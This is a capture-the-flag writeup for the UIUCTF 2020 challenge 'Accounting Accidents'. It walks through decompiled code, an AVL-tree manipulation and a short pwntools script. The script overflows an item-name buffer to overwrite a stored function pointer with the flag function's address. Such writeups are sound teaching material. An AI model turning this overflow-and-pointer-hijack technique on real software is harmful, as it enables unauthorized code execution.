---
layout:      post
title:       "Accounting Accidents [rev]"
description: "solved by not_really, sadboiben"
---

[//]: <> "This is here because jekyll is stupid"

{% raw %}

## Writeup by not_reallly

The first thing I always do is connect to the netcat without even looking at the file so I can get an idea of how the program looks.

```
[NookAccounting]: Booting up Fancy Laser Accounting Generator (F.L.A.G.) at {0x8048878}
[NookAccounting]: Added "Apples" with cost of 10 bells to accounting spreadsheet.
[NookAccounting]: Added "Fancy Seashells" with cost of 20 bells to accounting spreadsheet.
[NookAccounting]: Added "Tom Nook Shirts" with cost of 30 bells to accounting spreadsheet.
[NookAccounting]: Added "Airplane Ticket" with cost of 40 bells to accounting spreadsheet.
[NookAccounting]: Added "ATM Repairs" with cost of 50 bells to accounting spreadsheet.
[Isabelle]: Oh no! I cant seem to find what this item is, but it cost 25 bells, what is it?
Item: e
[Isabelle]: Ohmygosh! Thank you for remembering! Now I can get back to work!
[NookAccounting]: Added "e
" with cost of 25 bells to accounting spreadsheet.

[Isabelle]: Ohmyheck! I dont know how much "Shrub Trimming" costs. Can you tell me?
Shrub Trimming Cost: 1
[NookAccounting]: Added "Shrub Trimming" with cost of 1 bells to accounting spreadsheet.


[Isabelle]: Thank you so much! You're the best, I added it to the accounting system now
[Isabelle]: Ohmyheck! I dont know how much "Raymond Hush $$" costs. Can you tell me?
Raymond Hush $$ Cost: 2
[NookAccounting]: Added "Raymond Hush $$" with cost of 2 bells to accounting spreadsheet.


[Isabelle]: Thank you so much! You're the best, I added it to the accounting system now
[Isabelle]: Ohmyheck! I dont know how much "Town Hall Food" costs. Can you tell me?
Town Hall Food Cost: 3
[NookAccounting]: Added "Town Hall Food" with cost of 3 bells to accounting spreadsheet.


[Isabelle]: Thank you so much! You're the best, I added it to the accounting system now
[Isabelle]: Ohmyheck! I dont know how much "New Wall Art" costs. Can you tell me?
New Wall Art Cost: 4
[NookAccounting]: Added "New Wall Art" with cost of 4 bells to accounting spreadsheet.


[Isabelle]: Thank you so much! You're the best, I added it to the accounting system now
[Isabelle]: Okay thank you so much! I'll run the accounting software at address 0x80487a6

===Nook(TM) Accounting Very Large Software V 10.49185.2a===
-=Left=-
Raymond Hush $$: 2
Shrub Trimming: 1
-=Right=-
Tom Nook Shirts: 30
Airplane Ticket: 40
ATM Repairs: 50
============================================
```

We get 5 bits of input here, one for a name and four for different costs. Somehow, we have to change the address that the "accounting software" runs at so that it points at that FLAG address at the beginning. Well, now it's time to open up the program. We'll be using Ghidra to look at the code and IDA Free to debug. Also, let's take care of that slow text scrolling. It's going to be real annoying if we have to deal with that.

So here's what we get in Ghidra:

![javaw_nK5KMYGQsI](/img/uiuctf2020/javaw_nK5KMYGQsI.png)

Good, we get debug data. Looking at the green names here, we can see functions like rotate, newNode, etc. Having seen the trailer and seeing the [avl tree visualization](https://www.cs.usfca.edu/~galles/visualization/AVLtree.html) site there, I felt like this was an avl tree problem. Okay, let's actually look at main now.

```c
undefined4 main(void) {
  undefined4 uVar1;
  int iVar2;
  int in_GS_OFFSET;
  int local_13c;
  int local_138;
  char *local_12c [4];
  char local_11c [8];
  char local_114 [256];
  int local_14;
  undefined *local_10;
  
  local_10 = &stack0x00000004;
  local_14 = *(int *)(in_GS_OFFSET + 0x14);
  printf("[NookAccounting]: Booting up Fancy Laser Accounting Generator (F.L.A.G.) at {%p}\n", print_flag);
  uVar1 = insert(0, 10, "Apples");
  uVar1 = insert(uVar1, 20, "Fancy Seashells");
  uVar1 = insert(uVar1, 30, "Tom Nook Shirts");
  uVar1 = insert(uVar1, 40, "Airplane Ticket");
  uVar1 = insert(uVar1, 50, "ATM Repairs");
  local_13c = insert(uVar1,25,0);
  putchar(10);
  local_12c[0] = "Shrub Trimming";
  local_12c[1] = "Raymond Hush $$";
  local_12c[2] = "Town Hall Food";
  local_12c[3] = "New Wall Art";
  local_138 = 0;
  while (local_138 < 4) {
    sprintf(local_114,
            "[Isabelle]: Ohmyheck! I dont know how much \"%s\" costs. Can you tell me?\n%s Cost: ",
            local_12c[local_138], local_12c[local_138]);
    fancy_print(local_114);
    fflush(stdout);
    memset(local_11c, 0, 8);
    read(0, local_11c, 8);
    iVar2 = atoi(local_11c);
    local_13c = insert(local_13c, iVar2, local_12c[local_138]);
    putchar(10);
    fancy_print("\n[Isabelle]: Thank you so much! You\'re the best, I added it to the accounting system now\n");
    local_138++;
  }
  sprintf(local_114,
          "[Isabelle]: Okay thank you so much! I\'ll run the accounting software at address %p\n",
          *(undefined4 *)(local_13c + 0x20));
  fancy_print(local_114);
  (**(code **)(local_13c + 0x20))(local_13c);
  putchar(10);
  uVar1 = 0;
  if (local_14 != *(int *)(in_GS_OFFSET + 0x14)) {
    uVar1 = __stack_chk_fail_local();
  }
  return uVar1;
}
```

It looks like we insert 6 items into our tree (one without a name, probably the one we have to type ourselves) then insert 4 items using the names from local_12c. Then we run the code at local_13c + 0x20. uVar1 and local_13c both seem to reference the tree. What we need to figure out is what that + 0x20 references.

Time to look at the other functions now. Insert is kind of long and slightly unimportant, but it does call newNode. Let's look there next.

```c
undefined4 * newNode(undefined4 param_1, char *param_2) {
  size_t __n;
  undefined4 *puVar1;
  int in_GS_OFFSET;
  char local_110 [256];
  int local_10;
  
  local_10 = *(int *)(in_GS_OFFSET + 0x14);
  puVar1 = (undefined4 *)malloc(0x24);
  *puVar1 = param_1;
  puVar1[1] = 0;
  puVar1[2] = 0;
  puVar1[3] = 1;
  puVar1[8] = 0x80487a6;
  if (param_2 == (char *)0x0) {
    sprintf(local_110,
            "[Isabelle]: Oh no! I cant seem to find what this item is, but it cost %d bells, whatis it?\nItem: ",
            param_1);
    fancy_print(local_110);
    fflush(stdout);
    memset(puVar1 + 4, 0, 16);
    fgets((char *)(puVar1 + 4), 21, stdin);
    *(undefined *)((int)puVar1 + 0x1f) = 0;
    fancy_print("[Isabelle]: Ohmygosh! Thank you for remembering! Now I can get back to work!\n");
  } else {
    __n = strlen(param_2);
    strncpy((char *)(puVar1 + 4), param_2, __n);
  }
  fflush(stdout);
  printf("[NookAccounting]: Added \"%s\" with cost of %d bells to accounting spreadsheet.\n",  puVar1 + 4, *puVar1);
  usleep(100000);
  if (local_10 != *(int *)(in_GS_OFFSET + 0x14)) {
    puVar1 = (undefined4 *)__stack_chk_fail_local();
  }
  return puVar1;
}
```

Aha, now we can see something being malloc'd here of 0x24 size. That's probably the node being initialized. There's lots of stuff happening here, so let's try to make a memory map of how the node is laid out.

```
4*0 - count (comes from addNode's first arg which comes from insert's 2nd arg)
4*1 - zero ?
4*2 - zero ?
4*3 - one  ?
4*4 - name of item
4*5 - name of item (cont.)
4*6 - name of item (cont.)
4*7 - name of item (cont.)
4*8 - 0x80487a6 (goes to printEdges, interesting we store a function pointer in memory)
```

A few things stick out to me. We're putting the value of printEdges into memory, so that's probably what we need to change to the flag address that gets printed out in the beginning. For the item name, memset uses a length of 16 but fgets uses a length of 21. Most likely we need to overwrite the bytes in the value puVar1[8] to jump to the flag instead. Seems pretty easy.

One more thing before we get started, before we debug I want to remove the slow text scrolling. Let's look at fancy_print.

```c
void fancy_print(char *param_1) {
  size_t sVar1;
  uint local_10;
  
  local_10 = 0;
  while(true) {
    sVar1 = strlen(param_1);
    if (sVar1 <= local_10) break;
    putchar((int)param_1[local_10]);
    fflush(stdout);
    usleep(30000);
    local_10++;
  }
  return;
}
```

Seems pretty simple enough. We just need to change 30000 to 0. This one is so easy we can manually hex patch this one. There's also Ghidra's Ctrl+Shift+G patch instruction command as well.

![javaw_PIrVbEykGT](/img/uiuctf2020/javaw_PIrVbEykGT.png)

The base is probably 0x08048000 so the actual file position of this would be 0x098f. Let's go check.

![HxD_o2VMB099qa](/img/uiuctf2020/HxD_o2VMB099qa.png)

Looks like we found it. We'll change the 3075 bytes to 0000.

Now let's open in IDA so we can see what this looks like in memory. I'll use the same `e 1 2 3 4` input as last time.

First, let's set a breakpoint after eax sets var_134 and on this call eax instruction, right before we call the printEdges function which we discovered earlier.

![VirtualBoxVM_dKKX2ka5WP](/img/uiuctf2020/VirtualBoxVM_dKKX2ka5WP.png)

So what's at var_134? We know it's a reference to the tree, so it's most likely the root node. Take a look at the address eax points to.

![VirtualBoxVM_cPWTRlbdIO](/img/uiuctf2020/VirtualBoxVM_cPWTRlbdIO.png)

Now we can see some of the items in the tree. And Apples seems to be the first one.

So remember how I talked about the avl tree from the trailer? Let's try adding the first few items that get added to that visualization.

```c
uVar1 = insert(0, 10, "Apples");
uVar1 = insert(uVar1, 20, "Fancy Seashells");
uVar1 = insert(uVar1, 30, "Tom Nook Shirts");
uVar1 = insert(uVar1, 40, "Airplane Ticket");
uVar1 = insert(uVar1, 50, "ATM Repairs");
local_13c = insert(uVar1,25,0);
```

![firefox_aV8aPoPm20](/img/uiuctf2020/firefox_aV8aPoPm20.png)

Okay, looks fine. Now let's add those `1 2 3 4` numbers we input in when asked.

![firefox_6TlVKlbREp](/img/uiuctf2020/firefox_6TlVKlbREp.png)

Aha! Look at what node's at the root now. It's 10. And 10 is also Apples. So we're definitely on the right track, we need to figure out how to get our node to the root.

![firefox_aV8aPoPm20](/img/uiuctf2020/firefox_aV8aPoPm20.png)

So first we need to get 25 where the 20 is. To upset the balance, we need to make 25's side weigh more than 10.

![firefox_vtA1N4RgqV](/img/uiuctf2020/firefox_vtA1N4RgqV.png)

Now we add 27 and this unbalances the tree, moving 25 in 20's place.

![firefox_9nugIxITaS](/img/uiuctf2020/firefox_9nugIxITaS.png)

Then we can add something to the left of 10 to unbalance the root and move 25 in it's place.

![firefox_unvYja25mm](/img/uiuctf2020/firefox_unvYja25mm.png)

There we go! We now have 25 at the root. So whenever we get asked about prices, we now need to type `24 26 27 5`.

All that's left now is to overwrite the print address to go to the flag instead. If we look at the memory map, we'll only need to print 16 characters and then four bytes for the address. Those characters won't be typable, so let's write a script to do it for us.

```python
from pwn import *

sh = process("./accounting-fast")#remote("chal.uiuc.tf", 2001)
sh.recvuntil("{")
flag = sh.recvuntil("}")[2:-1] #remove 0x and } from flag address
flagAsBytes = p32(int(flag, 16))
print("flag address: " + flag)

print(sh.recvuntil("Item: "))
sh.send("blahblahblahblah" + flagAsBytes)
print(sh.recvuntil("Cost: "))
sh.send("24")
print(sh.recvuntil("Cost: "))
sh.send("26")
print(sh.recvuntil("Cost: "))
sh.send("27")
print(sh.recvuntil("Cost: "))
sh.send("5")
sh.read()
sh.interactive()
```

And we got it!

{% endraw %}
